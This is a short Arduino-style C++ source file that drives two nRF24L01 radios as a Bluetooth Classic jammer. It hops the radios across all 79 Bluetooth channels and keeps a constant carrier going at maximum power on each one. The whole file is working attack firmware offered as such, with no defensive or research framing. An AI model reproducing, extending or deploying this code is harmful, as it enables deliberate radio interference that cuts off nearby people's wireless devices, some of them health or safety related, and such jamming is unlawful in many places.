#include "attack.h"
#include "radio.h"

static int attack_counter = 0;
static uint8_t bt_ch1 = 2;
static uint8_t bt_ch2 = 40;

void attack_init() {
    Serial.println(F("[ATTACK] Ultra-High-Speed BT Classic Jammer initialized"));
}

void attack_run_step(int& counter) {
    attack_counter++;
    counter = attack_counter;

    if (!radios_ready()) {
        return;
    }

    RF24& r1 = get_radio_1();
    RF24& r2 = get_radio_2();

    // Bluetooth FHSS standard frequency hop simulation across all 79 channels (0 to 78)
    // RF24 channel = Freq - 2400 MHz (Channels 0 to 80 cover 2400 to 2480 MHz)
    bt_ch1 = (bt_ch1 + 3) % 79;
    bt_ch2 = (bt_ch2 + 37) % 79;

    r1.setChannel(bt_ch1);
    r2.setChannel(bt_ch2);

    r1.startConstCarrier(RF24_PA_MAX, bt_ch1);
    r2.startConstCarrier(RF24_PA_MAX, bt_ch2);
}
